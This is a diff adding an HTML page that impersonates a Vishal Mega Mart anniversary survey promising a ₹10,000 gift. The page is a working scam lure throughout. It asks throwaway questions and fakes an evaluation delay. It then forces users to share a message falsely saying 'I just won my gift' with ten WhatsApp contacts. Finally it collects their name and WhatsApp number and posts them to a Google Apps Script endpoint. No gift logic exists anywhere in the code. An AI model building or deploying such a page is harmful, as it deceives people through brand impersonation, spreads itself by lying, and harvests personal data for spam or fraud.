@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Vishal Mega Mart Survey</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+  <style>
+    body { font-family: 'Roboto', sans-serif; background: #f4f6f8; margin: 0; padding: 0; }
+    .card { max-width: 600px; margin: 30px auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 6px rgba(0,0,0,0.1); }
+    .button { background: #007bff; color: white; padding: 12px; border: none; border-radius: 25px; font-size: 16px; cursor: pointer; width: 100%; margin-top: 10px; }
+    .button:hover { background: #0056b3; }
+    .progress-container { background-color: #e0e0e0; border-radius: 20px; overflow: hidden; margin-top: 20px; }
+    .progress-bar { height: 20px; width: 0%; background-color: #28a745; transition: width 0.3s ease; }
+    .hidden { display: none; }
+    input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #ccc; border-radius: 5px; font-size: 16px; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h2>🎉 Vishal Mega Mart Anniversary Offer 🎉</h2>
+    <p>Answer simple questions and get a chance to win ₹10,000 gift!</p>
+
+    <div id="question-container">
+      <p><strong id="question-text">Question 1 of 4:</strong> Do you know Vishal Mega Mart?</p>
+      <button class="button" onclick="nextQuestion()">Yes</button>
+      <button class="button" onclick="nextQuestion()">No</button>
+    </div>
+
+    <div id="loading-section" class="hidden">
+      <p>Valuating your answers...</p>
+    </div>
+
+    <div id="share-section" class="hidden">
+      <p>You are selected for a Special Deal! Share this with 10 friends or groups:</p>
+      <button class="button" onclick="shareAction()">Share on WhatsApp</button>
+      <div class="progress-container">
+        <div class="progress-bar" id="progress-bar"></div>
+      </div>
+    </div>
+
+    <div id="form-section" class="hidden">
+      <h3>🎁 Enter your details to receive the gift</h3>
+      <form onsubmit="submitForm(event)">
+        <input type="text" id="name" placeholder="Your Name" required />
+        <input type="tel" id="phone" placeholder="WhatsApp Number" required maxlength="10" />
+        <button class="button" type="submit">Submit</button>
+      </form>
+    </div>
+  </div>
+
+  <script>
+    const questions = [
+      "Do you know Vishal Mega Mart?",
+      "Have you shopped at Vishal Mega Mart before?",
+      "Would you recommend Vishal Mega Mart to friends?",
+      "How would you rate Vishal Mega Mart’s offers?"
+    ];
+    let currentQuestion = 0;
+    let shareCount = 0;
+
+    function nextQuestion() {
+      currentQuestion++;
+      const questionText = document.getElementById("question-text");
+      if (currentQuestion < questions.length) {
+        questionText.innerText = "Question " + (currentQuestion + 1) + " of 4: " + questions[currentQuestion];
+      } else {
+        document.getElementById("question-container").classList.add("hidden");
+        document.getElementById("loading-section").classList.remove("hidden");
+        setTimeout(() => {
+          document.getElementById("loading-section").classList.add("hidden");
+          document.getElementById("share-section").classList.remove("hidden");
+        }, 3000);
+      }
+    }
+
+    function shareAction() {
+      shareCount++;
+      const progressBar = document.getElementById("progress-bar");
+      let percent = Math.min(100, (shareCount / 10) * 100);
+      progressBar.style.width = percent + "%";
+      const msg = encodeURIComponent("🎉 Vishal Mega Mart Anniversary Offer 🎉\n\nAnswer simple questions and get a chance to win ₹10,000 gift!\n\nI just won my gift, you can too 🎁\n\nTap to try: https://yourwebsite.com");
+      window.open("https://wa.me/?text=" + msg, "_blank");
+      if (shareCount >= 10) {
+        document.getElementById("form-section").classList.remove("hidden");
+      }
+    }
+
+    function submitForm(event) {
+      event.preventDefault();
+      const name = document.getElementById("name").value.trim();
+      const phone = document.getElementById("phone").value.trim();
+
+      if (name && phone.length === 10) {
+        fetch("https://script.google.com/macros/s/YOUR_SCRIPT_ID_HERE/exec", {
+          method: "POST",
+          body: JSON.stringify({ name, phone }),
+          headers: { "Content-Type": "application/json" }
+        })
+        .then(res => res.text())
+        .then(response => {
+          alert("🎉 Thank you " + name + "! Your gift will be sent to WhatsApp: " + phone);
+        })
+        .catch(err => {
+          alert("Something went wrong. Please try again later.");
+        });
+      } else {
+        alert("Please enter valid details.");
+      }
+    }
+  </script>
+</body>
+</html>
